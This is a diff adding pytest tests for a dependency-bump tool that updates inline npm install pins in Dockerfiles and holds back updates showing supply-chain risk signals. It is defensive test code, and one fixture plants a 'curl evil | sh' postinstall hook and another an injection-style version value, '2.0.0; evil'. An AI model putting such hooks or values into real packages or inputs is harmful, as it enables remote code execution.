@@ -2808,3 +2808,111 @@ wheels = [
             lockfile, target_minor=15,
         )
         assert missing == []
+
+
+class _InlineNpm:
+    def __init__(self, versions=None):
+        self.versions = versions or ['1.0.0', '1.1.0', '2.0.0-beta.1']
+        self.calls = []
+        self.meta = {'dist-tags': {'latest': versions[-1] if versions else '1.1.0'}, 'versions': {v: {'version': v, 'maintainers': [{'name':'owner'}],
+                                     'scripts': {}, 'engines': {'node': '>=20'}} for v in self.versions},
+                     'time': {v:'2020-01-01T00:00:00Z' for v in self.versions}}
+    def list_versions(self, name):
+        self.calls.append(name)
+        return self.versions
+    def get_metadata(self, name):
+        self.calls.append(name)
+        return self.meta
+
+
+def test_inline_npm_discovery_and_apply_use_shared_scoped_grammar(tmp_path):
+    df=tmp_path/'Dockerfile'
+    text='''FROM scratch
+# npm install foo@1.0.0
+RUN echo "npm install foo@1.0.0" && npm install -g --prefix /usr foo@1.0.0 '@scope/tool@1.0.0'
+RUN npm install --registry=https://other.example private@1.0.0
+RUN npx unused@1.0.0
+'''
+    df.write_text(text);npm=_InlineNpm()
+    report=run_bump(tmp_path,http=_StubHttp({}),npm_client=npm,apply=True)
+    candidates=[c for c in report.candidates if c.kind=='inline_install_npm']
+    assert {c.locator for c in candidates}=={'foo','@scope/tool'}
+    assert all(c.upstream.kind=='npm_meta' and c.target_version=='1.1.0' for c in candidates)
+    assert all(r.verdict==_VERDICT_CLEAN and r.rewrite_result.applied for r in report.results)
+    assert set(npm.calls)=={'foo','@scope/tool'}
+    assert df.read_text()==text.replace(' /usr foo@1.0.0', ' /usr foo@1.1.0').replace("'@scope/tool@1.0.0'","'@scope/tool@1.1.0'")
+
+
+@pytest.mark.parametrize('change', ['hooks','maintainer','engine','invalid_engine','deprecated','missing','metadata_error','vuln_error'])
+def test_inline_npm_review_signals_prevent_automatic_rewrite(tmp_path,monkeypatch,change):
+    from packages.sca.bump import orchestrator
+    df=tmp_path/'Dockerfile';text='FROM scratch\nRUN npm install foo@1.0.0\n';df.write_text(text)
+    npm=_InlineNpm()
+    if change=='hooks': npm.meta['versions']['1.1.0']['scripts']={'postinstall':'curl evil | sh'}
+    elif change=='maintainer': npm.meta['versions']['1.1.0']['maintainers']=[{'name':'new-owner'}]
+    elif change=='engine': npm.meta['versions']['1.1.0']['engines']={'node':'>=26'}
+    elif change=='invalid_engine': npm.meta['versions']['1.1.0']['engines']='invalid'
+    elif change=='deprecated': npm.meta['versions']['1.1.0']['deprecated']='do not use'
+    elif change in {'missing','metadata_error'}:
+        original = npm.meta
+        calls = []
+        def disappearing_metadata(name):
+            calls.append(name)
+            if len(calls) == 1:
+                return original
+            if change == 'metadata_error':
+                raise RuntimeError('registry down')
+            return None
+        npm.get_metadata=disappearing_metadata
+    elif change=='vuln_error':
+        def fail(**kw):raise RuntimeError('OSV down')
+        monkeypatch.setattr(orchestrator,'evaluate_bump_vulns',fail)
+    report=run_bump(tmp_path,http=_StubHttp({}),npm_client=npm,apply=True,
+                    osv_client=object() if change=='vuln_error' else None)
+    assert len(report.results)==1
+    assert report.results[0].verdict>=_VERDICT_REVIEW
+    assert not report.results[0].rewrite_result or not report.results[0].rewrite_result.applied
+    assert df.read_text()==text
+
+
+def test_inline_npm_osv_and_supply_chain_gates_receive_npm_identity(tmp_path,monkeypatch):
+    from packages.sca.bump import orchestrator
+    (tmp_path/'Dockerfile').write_text('FROM scratch\nRUN npm install @scope/tool@1.0.0\n')
+    calls=[]
+    def supply(**kw): calls.append(('supply',kw));return []
+    def vulns(**kw): calls.append(('vulns',kw));return []
+    monkeypatch.setattr(orchestrator,'evaluate_bump_supply_chain',supply)
+    monkeypatch.setattr(orchestrator,'evaluate_bump_vulns',vulns)
+    run_bump(tmp_path,http=_StubHttp({}),npm_client=_InlineNpm(),osv_client=object())
+    assert [kind for kind,_ in calls]==['supply','vulns']
+    assert all(kw['ecosystem']=='npm' and kw['name']=='@scope/tool' for _,kw in calls)
+
+
+@pytest.mark.parametrize('versions', [['0.9.0'],['1.0.0'],['2.0.0-rc.1'],['2.0.0; evil'],['1.0'],['9'*5000+'.0.0']])
+def test_inline_npm_never_downgrades_or_uses_nonstable_targets(tmp_path,versions):
+    (tmp_path/'Dockerfile').write_text('FROM scratch\nRUN npm install foo@1.0.0\n')
+    report=run_bump(tmp_path,http=_StubHttp({}),npm_client=_InlineNpm(versions))
+    assert not report.candidates
+
+
+def test_inline_npm_exclusion_and_missing_client_do_not_query(tmp_path):
+    (tmp_path/'Dockerfile').write_text('FROM scratch\nRUN npm install foo@1.0.0\n')
+    npm=_InlineNpm()
+    assert not run_bump(tmp_path,http=_StubHttp({}),npm_client=npm,exclude=['Dockerfile']).candidates
+    assert npm.calls==[]
+    assert not run_bump(tmp_path,http=_StubHttp({})).candidates
+
+
+def test_inline_npm_respects_latest_tag_instead_of_highest_published_version(tmp_path):
+    (tmp_path/'Dockerfile').write_text('FROM scratch\nRUN npm install foo@1.0.0\n')
+    npm=_InlineNpm(['1.0.0','1.1.0','9.0.0'])
+    npm.meta['dist-tags']['latest']='1.1.0'
+    report=run_bump(tmp_path,http=_StubHttp({}),npm_client=npm)
+    assert report.candidates[0].target_version=='1.1.0'
+
+
+def test_inline_npm_missing_registry_latest_reports_skip(tmp_path):
+    (tmp_path/'Dockerfile').write_text('FROM scratch\nRUN npm install foo@1.0.0\n')
+    npm=_InlineNpm();npm.meta.pop('dist-tags')
+    report=run_bump(tmp_path,http=_StubHttp({}),npm_client=npm)
+    assert not report.candidates and any('latest tag' in reason for _,_,reason in report.skipped)
